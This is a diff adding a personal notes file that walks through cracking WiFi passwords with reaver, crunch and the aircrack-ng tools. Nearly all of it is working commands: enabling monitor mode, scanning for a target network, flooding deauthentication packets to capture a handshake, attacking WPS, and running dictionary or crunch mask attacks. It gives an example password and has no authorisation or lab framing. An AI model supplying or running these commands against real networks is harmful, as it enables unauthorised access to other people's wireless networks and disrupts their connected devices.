@@ -1,0 +1,50 @@
+wifi password cracking from a virtual machiene is not a good idea because of its resources
+
+to crack wps
+*reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -vv
+
+to generate passwords
+*crunch 3 5 xhwt231
+
+now to use without saving any file 
+
+crunch 3 29 abcdefghijklmnopqrstuvwxyz1234567890 | aircrack-ng -w - password.txt
+
+%STARTING%
+
+ifconfig #to see your interface
+
+ifconfig wlan0 down 
+
+iwconfig wlan0 mode monitor
+
+ifconfig wlan0 up
+
+airmon-ng check wlan0mon
+
+kill PID
+
+airodump-ng wlan0mon
+
+after finding your target u can stop the scan [take a look at the power (-28 > -45)]
+
+airodump-ng -c 4  -w scan_tst --bssid 90:00:00:00:00:00 wlan0mon 
+
+on another tab
+
+aireplay-ng -0 0 -a 90:00:00:00:00:00 wlan0mon
+
+after getting an handshake u can stop the scan {but in order for it to work there must be at least one device connected on the internet}
+
+(aircrack-ng -w /usr/share/wordlists/rockyou.txt captured_file.cap)
+
+%or%
+to use this method is highlly recomended to someting about the target's password(length; wich letters,numbers, or caracters are included)
+
+crunch 11 11 -t %%%%Thunder 1234567890 | aircrack-ng -w - scan_tst-01.cap -e (enter the wifi's name)
+
+#in the example the password was 101Thunder
+
+crunch 11 11 -t %%%%,@@@der -f charset.lst mixalpha-numeric-space | aircrack-ng -w - scan_tst-01.cap -e (enter the wifi's name)
+
+
